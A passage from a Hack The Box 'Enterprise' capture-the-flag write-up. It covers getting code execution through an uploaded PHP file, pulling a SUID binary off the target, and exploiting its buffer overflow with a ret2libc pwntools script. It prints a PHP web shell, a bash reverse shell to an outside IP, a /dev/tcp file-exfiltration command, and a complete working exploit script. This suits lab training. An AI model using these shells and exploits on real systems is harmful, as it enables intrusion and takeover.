<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_077.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_078.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_079.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_080.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_081.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_082.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now with generating some **.php** files I finally can get a **RCE** on the machine (which <ins>I still don't know if it's another container or not</ins>). After creating a file in the files folder in **PHP** to execute the command to send me a **Reverse Shell**, I access the box and check that I am finally in the real one and I can already access the first flag, after performing a last console treatment and recognition commands. In fact, I find myself with a third **codename**, due to the different containers depleted.

> **Victime Machine:**

```bash
echo "<?php system('whoami'); ?>" > pwned.php
echo "<?php system('hostname -I'); ?>" > pwned.php

# https://enterprise.htb/files/pwned.php
#    --> www-data
#    --> 10.10.10.61 172.17.0.1 dead:beef::250:56ff:feb9:e560

echo "<?php system('bash -i >&/dev/tcp/10.10.14.16/443 0>&1'); ?>" > pwned.php
```

> **Attacker Machine:**

```bash
nc -nlvp 443
```

> **Victime Machine:**

```bash
# https://enterprise.htb/files/pwned.php        # :(

echo "<?php system('bash -c "bash -i >&/dev/tcp/10.10.14.16/443 0>&1"'); ?>" > pwned.php
# https://enterprise.htb/files/pwned.php        # :(

echo "<?php system('bash -c \"bash -i >&/dev/tcp/10.10.14.16/443 0>&1\"'); ?>" > pwned.php
# https://enterprise.htb/files/pwned.php        # :)

whoami
hostname
hostname -I
script /dev/null -c bash
[Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
uname -a
lsb_release -a
id
groups
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_083.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_084.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_085.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_086.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_087.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_088.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Continuing with the **Reconnaissance** commands, I find two binaries with the **SUID** bit enabled, `pkexec` and `lcars`, the first one I will discard because it <ins>is not the target of this machine</ins>, but the second one immediately reminds me of the system exposed on port **32812**, so I quickly transfer it to my attacking machine to debug it and check if it is vulnerable to a **Buffer Overflow**. When executing it I need a code to continue with its execution, I can find it with `ltrace` (in case I can't with this tool I can resort to `Ghidra`). I continue testing the system and choosing option 4 and entering a long enough string I manage to crash the binary, this way I can start looking for all the information I need to create an exploit and exploit it.

> **Victime Machine:**

```bash
find \-perm -4000 2>/dev/null
#    --> ./usr/bin/pkexec
#    --> ./bin/lcars

ls -l ./bin/lcars
file ./bin/lcars
md5sum ./bin/lcars
```

> **Attacker Machine:**

```bash
nc -nlvp 443 > lcars_binary
```

> **Victime Machine:**

```bash
cat < ./bin/lcars > /dev/tcp/10.10.14.16/443
# Or:
# nc 10.10.14.16 443 < ./bin/lcars
```

> **Attacker Machine:**

```bash
md5sum lcars_binary

sudo apt install ltrace strace -y
chmod +x lcars_binary
ltrace ./lcars_binary
#    --> strcmp("1234\n", "picarda1")        <-- Code ! :)

# Test Buffer Overflow Vulnerabiliy
./lcars_binary
#    /> picarda1
#    /> 4
#    /> AAAAAAAA.......AAAAAAA
#         --> Segmentation fault (core dumped)        --> BOF!!!!
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_089.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_090.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_091.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_092.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_093.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I am going to collect all the information I need to create the exploit, first I check what **[protection properties](https://mdanilor.github.io/posts/memory-protections/){:target="_blank"}** the binary has enabled. The **NX** is disabled (<ins>which would allow me to execute a payload in memory</ins>) but the **PIE** is (<ins>it is not recommended to use memory, due to the randomization of the offset</ins>). I also check that the **registers** and the **EIP** are being overwritten with the **A's** that I enter, with `gdb` I can inspect to see in a precise way the values of the same ones. Then I can calculate the offset to make me **EIP** and enter an address that I indicate and thus in this way execute a malicious payload, with `python` I generate a string with the necessary amount of **A's** and then **4 B**, in this way I finally check my goal of having control of **EIP**. I need to **[install gdb](https://www.gdbtutorial.com/tutorial/how-install-gdb){:target="_blank"}** and **[peda](https://github.com/longld/peda){:target="_blank"}** on my machine, because I recently crash my **OS**, things that happen when you play a lot and take care little, things of inexperienced.

> **GDB** or **GNU Debugger** is GNU project which helps to debug software applications and analyze what is happening during program execution. It helps to:

    - investigate improper behavior of your program.
    - find cause of logical error which is hard to find just by looking at source code.
    - analyze crash occuring in your application.

> **PEDA**: Python Exploit Development Assistance for GDB.

> Position Independent Executables (**PIE**) randomizes the offset of almost every memory region in the binary. To bypass this mitigation, one must have a leaked address to calculate the offset and compensate.

```bash
sudo apt-get update
sudo apt-get install gdb

sudo su         # [root user]
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
su user         # [low privilege user]
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

gdb ./lcars_binary
    /> checksec
#     --> NX: disabled      :)
#     --> PIE: ✓            :(        Is recommended not inyect shellcode in the stack!

    /> r
    /> picarda1
    /> 4
    /> AAAA....A
#     --> EBP: 0x41414141 ('AAAA')
#     --> ESP: 0xffffce50 ('A' <repeats 200 times>...)
#     --> EIP: 0x41414141 ('AAAA')                        <-- Is not a record

    /> i r                      # <-- see all Records
    /> pattern_create 1000
    /> r
    /> picarda1
    /> 4
    /> AAAA....
    /> pattern_offset $eip
    /> pattern_offset 0x25412425
    /> pattern_offset '%$A%'
#     --> %$A% found at offset: 212

file lcars
#   --> ELF 32-bit --> little-endian

python3 -c 'print("A"*212 + "B"*4 + "C"*100)'

    /> r
    /> picarda1
    /> 4
    /> AAAAAA...CCCC            # :)
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_094.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_095.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_096.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_097.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_098.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

On the victim machine I check that the value of the **`randomize_va_space`** file is set to **0** (**disabled**) to verify that **AXLR** is disabled, I can create an oneline to validate it too. Then I can search with `gdb` the `system` and `exit` addresses (since I will have to use the **[`ret2libc` technique to exploit the Buffer Overflow](https://roman1.gitbook.io/blog/stack-exploitation/32-bit-return2libc){:target="_blank"}**) and I can also [search the `sh` string with `gdb`](https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb){:target="_blank"}. I have to <ins>be careful with the values of the addresses</ins> I got when using it in the script, since the binary is **32 bits** and I can use the **[`p32`](https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/pwn/pwntools/p32-or-p64-or-struct.html){:target="_blank"}** library or `struct` to convert the addresses. I make a first test of my exploit to verify the connectivity with the service and everything goes well for the moment.

> **[struct](https://docs.python.org/3/library/struct.html){:target="_blank"}**: This module converts between Python values and C structs represented as Python bytes objects.

> Our computers by default uses **little-endian** format. So if we have a function **main** and it’s address is `0x555555400992` in little endian format it will be: `\x92\x09\x40\x55\x55\x55` but it is 6 bytes. But our modern machines are 64bits. That means 8 bytes. So after padding it will be `\x92\x09\x40\x55\x55\x55\x00\x00`. `p64()` does exactly this for us. We can also `pack` as big endian using `endian=’big’` parameter in packing functions. If the binary is 32 bits, then we use `p32()`. It converts the address to 32 bits/4 bytes. the p32(), p64() use `struct.pack()` function underneath. And any characters or strings we use we need to use it as bytecode e.g. `payload = b”A”*40 + p64(main_address)`.

> **Victime Machine:**

```bash
cat /proc/sys/kernel/randomize_va_space 
#    --> 0

ldd /bin/lcars | grep libc
ldd /bin/lcars | grep libc | awk 'NF{print $NF}' | tr -d '()'
for i in $(seq 1 100); do ldd /bin/lcars | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
#    --> 0xf7e32000        <-- libc base address static!    --> NO AXLR ACTIVE!!
```
> **Attacker Machine:**

```bash
# TARGET:     ret2libc -> system_addr -> exit_addr -> bin_sh
gdb ./lcars_binary
    /> help p
#      --> print, inspect, p
    /> p system
#      --> 0xf7c4dd10
    /> p exit
#      --> 0xf7c3d230
    /> help info
#      info, inf, i
#      Generic command for showing things about the program being debugged.
#        info proc -- Show additional information about a process.
    /> help info proc
#      info proc mappings -- List memory regions mapped by the specified process.        :( Not much information here
    /> info proc mappings
#      --> /usr/lib32/libc.so.6
    /> help find                      <-- Deprecated
#      --> Alias for 'peda searchmem'
    /> find &system,+9999999,"sh"     <-- Deprecated
    /> help searchmem
#      --> Search for a pattern in memory; support regex search
#      Usage:
#              searchmem pattern start end
    /> searchmem "/bin/sh" 0xf7c00000 0xf7c22000      # :(
    /> searchmem "/bin/sh" 0xf7c22000 0xf7d9f000      # :(
    /> searchmem "/bin/sh" 0xf7d9f000 0xf7e22000      # :(
#      --> libc.so.6 : 0xf7db9dcd ("/bin/sh")
    /> help x
#      --> Examine memory: x/FMT ADDRESS.
    /> x /s 0xf7db9dcd
#      --> 0xf7db9dcd: "/bin/sh"

file lcars_binary
#    --> ELF 32-bit LSB pie executable, Intel 80386
```

> **lcars_bof.py**

```python
#!/usr/bin/python3

from pwn import *
from struct import pack

# Global variables
host, port = "10.10.10.61", 32812

def exploitBOF():

    # Target: ret2libc --> EIP --> system_addr --> exit_addr --> bin_sh_addr

    # gdb-peda$ pattern_offset $eip
    # 625026085 found at offset: 212
    offset = 212
    junk = b"A" * offset

    # gdb-peda$ p system
    # $2 = {<text variable, no debug info>} 0xf7c4dd10 <system>

    system_addr = pack("<I",0xf7c4dd10)

    # gdb-peda$ p exit
    # $3 = {<text variable, no debug info>} 0xf7c3d230 <exit>

    exit_addr = pack("<I",0xf7c3d230)

    # gdb-peda$ searchmem "/bin/sh" 0xf7d9f000 0xf7e22000
    # Searching for '/bin/sh' in range: 0xf7d9f000 - 0xf7e22000
    # Found 1 results, display max 1 items:
    # libc.so.6 : 0xf7db9dcd ("/bin/sh")
    # gdb-peda$ x /s 0xf7db9dcd
    # 0xf7db9dcd:	"/bin/sh"

    bin_sh_addr = pack("<I",0xf7db9dcd)

    payload = junk + system_addr + exit_addr + bin_sh_addr

    context(os="linux", arch="i386")
    r = remote(host,port)

if __name__ == "__main__":

    exploitBOF()
```

```bash
# Check connection
nvim lcars_bof.py
python3 lcars_bof.py
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_099.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_100.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_101.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_102.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_103.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_104.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can now use the **system**, **exit** and **sh** addresses to try to execute a malicious command and get a **Reverse Shell**, I try several times but I can't get the session to stay open, there is something I did wrong. After a long time thinking, <ins>I understand my mistake</ins>, I was always using the wrong addresses, the ones **I was using are the ones I found in my machine and not the one of the victim host!** Once I find the correct ones and modify the exploit, I get a stable console and I can see the last flag, pwned box!

> **Attacker Machine:**

```bash
nvim lcars_bof.py
python3 lcars_bof.py
#          :(      Not work ??
# system, exit, /bin/sh addresses I need to look for on the victime machine !!!
```

> **Victime Machine:**

```bash
which gdb
gdb /bin/lcars -q
    /> info functions
    /> b *main
    /> r
    /> p system
#        --> 0xf7e4c060 <system>
    /> p exit
#        --> 0xf7e3faf0 <exit>
    /> find &system,+9999999,"sh"
#        --> 0xf7f6ddd5
    /> x /s 0xf7f6ddd5
#        --> 0xf7f6ddd5: "sh"
```

> **Attacker Machine:**

```bash
nvim lcars_bof.py
python3 lcars_bof.py            # :)

whoami
hostname
hostname -I
```

> **lcars_bof.py**

```python
#!/usr/bin/python3

from pwn import *
from struct import pack

# Global variables
host, port = "10.10.10.61", 32812

def exploitBOF():

    # Target: ret2libc --> EIP --> system_addr --> exit_addr --> bin_sh_addr

    # gdb-peda$ pattern_offset $eip
    # 625026085 found at offset: 212
    offset = 212
    junk = b"A" * offset

    # gdb-peda$ p system
    # $1 = {<text variable, no debug info>} 0xf7e4c060 <system>

    system_addr = pack("<I",0xf7e4c060)

    # gdb-peda$ p exit
    # $2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>

    exit_addr = pack("<I",0xf7e3faf0)

    # find &system,+9999999,"sh"
    # 0xf7f6ddd5

    bin_sh_addr = pack("<I",0xf7f6ddd5)

    payload = junk + system_addr + exit_addr + bin_sh_addr

    context(os="linux", arch="i386")
    r = remote(host,port)

    r.recvuntil(b"Enter Bridge Access Code:")
    r.sendline(b"picarda1")
    r.recvuntil(b"Waiting for input:")
    r.sendline(b"4")
    r.recvuntil(b"Enter Security Override:")
    r.sendline(payload)
    r.interactive()    

if __name__ == "__main__":

    exploitBOF()
```

<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_105.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_106.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_107.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_108.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Now that I understand more about the exploitation of a **Buffer Overflow**, I am going to take a break from **Reverse Engineering**, **ret2libc**, **memory spaces**, etc. It's a beautiful topic that I must let my brain finish processing and then go up a little more complexity, I must not forget that I was facing binaries with only one protection function enabled, I kill the box in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform and activate the next one, my path must continue.

<br /><br />
<img src="{{ site.img_path }}/enterprise_writeup/Enterprise_109.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
